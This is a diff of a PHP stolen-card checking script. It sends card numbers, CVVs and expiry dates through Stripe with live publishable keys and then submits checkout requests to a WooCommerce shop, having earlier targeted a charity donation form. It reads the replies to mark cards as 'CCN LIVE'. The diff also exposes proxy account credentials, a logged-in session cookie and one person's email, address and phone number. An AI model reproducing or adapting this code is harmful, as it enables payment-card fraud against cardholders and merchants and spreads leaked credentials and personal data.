@@ -67,6 +67,7 @@ curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 $resposta = curl_exec($ch);
+$username = value($resposta, '"username"', '"');
 $firstname = value($resposta, '"first":"', '"');
 $lastname = value($resposta, '"last":"', '"');
 $phone = value($resposta, '"phone":"', '"');
@@ -134,27 +135,32 @@ if($state=="Alabama"){ $state="AL";
 }else if($state=="wyoming"){ $state="WY";
 }else{$state="KY";} 
 
+$proxy = 'rproxie.iproyal.com:31112';
+$proxyauth = 'iproyal251:ftQH7bW7MmU3EshT_country-UnitedStates';
+
 # -------------------- [1 REQ] -------------------#
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
+//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
+//curl_setopt($ch, CURLOPT_PROXY, $proxy);
+//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'authority: api.stripe.com',
 'method: POST',
-'path: /v1/payment_methods',
+'path: /v1/sources',
 'scheme: https',
 'accept: application/json',
 'accept-language: en-US,en;q=0.9',
 'content-type: application/x-www-form-urlencoded',
 'origin: https://js.stripe.com',
-'referer: https://js.stripe.com/',
+'referer: Referer: https://js.stripe.com/',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-site',
-'user-agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36',
+'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
 ));
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
@@ -165,9 +171,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]='.$firstname.'+'.$lastname.'&billing_details[email]='.$email.'&billing_details[address][line1]='.$street.'&billing_details[address][line2]=16&billing_details[address][city]='.$city.'&billing_details[address][state]='.$state.'&billing_details[address][postal_code]='.$zip.'&billing_details[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=e81c494c-541f-4e9f-8ce9-00ccef83167cca1e4c&muid=152d6e80-8d63-46be-9fbb-8234ce85f167986f1c&sid=0a54a225-ace2-4e5e-9bd2-f82d3293d0a0a45c37&pasted_fields=number&payment_user_agent=stripe.js%2Fa58b3a46%3B+stripe-js-v3%2Fa58b3a46&time_on_page=44487&referrer=https%3A%2F%2Ffosterarmy.org%2F&key=pk_live_SMtnnvlq4TpJelMdklNha8iD&_stripe_account=acct_16x0KEClDL4A2tzX');
-
-
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$firstname.'+'.$lastname.'&owner[address][line1]='.$street.'&owner[address][state]='.$state.'&owner[address][city]='.$city.'&owner[address][postal_code]='.$zip.'&owner[address][country]=US&owner[email]='.$email.'&owner[phone]='.$phone.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=e81c494c-541f-4e9f-8ce9-00ccef83167cca1e4c&muid=bac118ac-527c-468e-8194-c6be187386bd194773&sid=ef1bb169-1e41-4ced-ba88-1b5f993e8d3c7aa2f9&pasted_fields=number&payment_user_agent=stripe.js%2Fa58b3a46%3B+stripe-js-v3%2Fa58b3a46&time_on_page=21381&referrer=https%3A%2F%2Fwww.wpsanctuary.com%2F&key=pk_live_T78W6nbIgm4d2LI9Gnygz0hT');
 
 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
@@ -175,8 +179,10 @@ $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 # -------------------- [2 REQ] -------------------#
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
-curl_setopt($ch, CURLOPT_URL, 'https://fosterarmy.org/wp-admin/admin-ajax.php');
+//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
+//curl_setopt($ch, CURLOPT_PROXY, $proxy);
+//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
+curl_setopt($ch, CURLOPT_URL, 'https://www.wpsanctuary.com/?wc-ajax=checkout');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -186,27 +192,26 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'authority: orangutan.org',
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'authority: www.wpsanctuary.com',
 'method: POST',
-'path: /wp-admin/admin-ajax.php',
+'path: /?wc-ajax=checkout',
 'scheme: https',
-'accept: */*',
+'accept: application/json, text/javascript, */*; q=0.01',
 'accept-language: en-US,en;q=0.9',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'cookie: _ga=GA1.2.1242720901.1608973877; _gid=GA1.2.2092062177.1608973877; __stripe_mid=152d6e80-8d63-46be-9fbb-8234ce85f167986f1c; __stripe_sid=0a54a225-ace2-4e5e-9bd2-f82d3293d0a0a45c37; wp-give_session_a5beb09409e316b773a4ddf7ce48c28c=6c0d290f4eb08e3274282c42051d36b0%7C%7C1609580620%7C%7C1609577020%7C%7C903170766fb943f93630275483ec73f2; wp-give_session_reset_nonce_a5beb09409e316b773a4ddf7ce48c28c=1; _gat=1',
-'origin: https://fosterarmy.org',
-'referer: https://fosterarmy.org/donate/?form-id=2043&payment-mode=stripe&form_id=2043',
+'cookie: wordpress_test_cookie=WP+Cookie+check; _ga=GA1.2.732771478.1609170491; _fbp=fb.1.1609170491636.1872559624; __stripe_mid=bac118ac-527c-468e-8194-c6be187386bd194773; woocommerce_items_in_cart=1; woocommerce_cart_hash=5a6a2d1c7c364cde490edfa89be23a99; wordpress_logged_in_68f9bfe21defc5008ce5b8d074179df1=emine.cay%7C1610380356%7CC8p9sMsBjBM12LWRWe1N4lBjf5HLc0ZHTqAWZyYMITx%7Cfc6400acf6db098be89779ff7064bcaad208f6059ad017afbea00ae5595d028d; wp_woocommerce_session_68f9bfe21defc5008ce5b8d074179df1=38%7C%7C1609343524%7C%7C1609339924%7C%7C1ddc35fa20369704c157a497575d8acf; mailchimp_email_id=82e8cde55d; _gid=GA1.2.344982404.1609318757; _gat_UA-98611848-1=1; __stripe_sid=ef1bb169-1e41-4ced-ba88-1b5f993e8d3c7aa2f9',
+'origin: https://www.wpsanctuary.com',
+'referer: https://www.wpsanctuary.com/checkout/',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-origin',
-'user-agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36',
+'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
    ));
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'give-honeypot=&give-form-id-prefix=2043-3&give-form-id=2043&give-form-title=One+Time+Gift&give-current-url=https%3A%2F%2Ffosterarmy.org%2Fdonate%2F&give-form-url=https%3A%2F%2Ffosterarmy.org%2Fdonate%2F&give-form-minimum=1&give-form-maximum=1000000&give-form-hash=2dd0e6f44a&give-recurring-logged-in-only=&give-logged-in-only=1&give_recurring_donation_details=%7B%22is_recurring%22%3Afalse%7D&give-amount=1&give_stripe_payment_method=&payment-mode=stripe&give_first=Emine&give_last=Cay&give_email=eminemugecay%40gmail.com&give_comment=&card_name=Emine+Cay&billing_country=US&card_address=2824+Byrd+Lane&card_address_2=17&card_city=Albuquerque&card_state=NY&card_zip=10006&give_agree_to_terms=1&give_action=purchase&give-gateway=stripe&action=give_process_donation&give_ajax=true');
-
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Emine&billing_last_name=Cay&billing_company=&billing_country=US&billing_address_1=2824+Byrd+Lane&billing_address_2=&billing_city=Albuquerque&billing_state=NY&billing_postcode=10006&billing_phone=5158744111&billing_email=eminemugecay%40gmail.com&payment_method=stripe&wc-stripe-payment-token=new&terms=on&terms-field=1&woocommerce-process-checkout-nonce=dd1cb983da&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&stripe_source=src_1I40WsIneqgQpf85Zn3vImV3');
 
 $result2 = curl_exec($ch);
 
@@ -291,6 +296,16 @@ elseif
 
 elseif
 (strpos($result2,  'Your card&#039;s security code is incorrect.')) {
+  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
+}
+
+elseif
+(strpos($result2,  'Your card&#039;s security code is invalid.')) {
+  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
+}
+
+elseif
+(strpos($result2,  'The CVC number is incorrect.')) {
   echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [ Checker Group (𝖜𝖈𝖌) ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
 }
 
